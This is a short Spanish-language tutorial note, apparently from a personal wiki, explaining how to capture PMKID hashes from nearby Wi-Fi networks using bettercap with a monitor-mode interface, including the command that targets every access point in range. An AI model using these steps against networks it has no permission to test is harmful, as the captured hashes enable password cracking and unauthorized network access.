Para realizar el ataque de [[PKMID]] con bettercap es bastante sencillo

Por supuesto abrimos bettercap con la tarjeta de red en modo monitor previamente.

	./bettercap -iface wlan0mon

Primero escaneamos los AP disponibles.

	>> wifi.recon on

y podemos ver los AP encontrados.

	>>wifi.show

Y con el siguiente comando realizamos el ataque.

	>>wifi.assoc all

Con esto ya tendremos un archivo .pcap donde contienen todos los hashes de las redes.
